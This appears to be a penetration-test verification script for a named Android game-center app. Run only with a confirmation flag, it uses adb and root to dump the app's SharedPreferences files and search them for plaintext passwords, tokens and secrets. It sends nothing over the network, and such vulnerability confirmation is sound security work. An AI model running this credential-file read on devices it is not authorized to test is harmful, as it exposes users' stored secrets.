#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-019 密码/token 明文持久化 —— 授权 root 测试设备 shared_prefs 检索（dry-run 默认）。

证据背景：
  - 密码/token 明文持久化于 SharedPreferences（Android）/UserDefault（iOS）
    （证据：traffic-analysis/step4/vuln_analysis.json VULN-019）。

边界：
  - 仅限授权的本地 root 测试设备；默认 dry-run 只打印命令，POC_CONFIRM=YES 才执行。
  - 只读取设备本地文件，不发送任何网络请求。
"""
import argparse
import os
import re
import shutil
import subprocess
import sys

PKG = "com.xm.zjgamecenter"
PATTERN = re.compile(r"password|token|ssid|session|secret", re.I)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="VULN-019 抓取授权 root 测试设备 shared_prefs 并检索明文敏感字段（dry-run 默认）"
    )
    ap.add_argument("--serial", required=True, help="adb 设备序列号（授权 root 测试设备）")
    args = ap.parse_args()

    adb = shutil.which("adb")
    if not adb:
        print("[-] 未找到 adb，请先安装 Android platform-tools 并加入 PATH", file=sys.stderr)
        return 2

    shell_cmd = f"su -c 'cat /data/data/{PKG}/shared_prefs/*.xml'"
    cmd = [adb, "-s", args.serial, "shell", shell_cmd]
    print("[=] 待执行命令:\n    " + " ".join(cmd))
    print("[=] 检索模式:", PATTERN.pattern)

    if os.environ.get("POC_CONFIRM") != "YES":
        print("\n[dry-run] 未设置 POC_CONFIRM=YES，仅打印命令不执行。"
              "确认目标为授权 root 测试设备后：POC_CONFIRM=YES python3 validate_request.py --serial <序列号>")
        return 0

    print("[+] POC_CONFIRM=YES，执行（仅限授权 root 测试设备）...")
    p = subprocess.run(cmd, capture_output=True, text=True, errors="replace")
    if p.returncode != 0:
        print(p.stderr, file=sys.stderr)
        print("[-] 执行失败：设备是否已 root？su 是否放行 adb shell？", file=sys.stderr)
        return p.returncode

    hits = [line for line in p.stdout.splitlines() if PATTERN.search(line)]
    print(f"\n[+] shared_prefs 命中敏感模式行数: {len(hits)}")
    for line in hits[:100]:
        print("    " + line.strip()[:300])
    if len(hits) > 100:
        print(f"    ... 其余 {len(hits) - 100} 行省略，请人工导出复核")
    print("\n[+] 结论：命中行即敏感字段明文落盘的直接证据。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
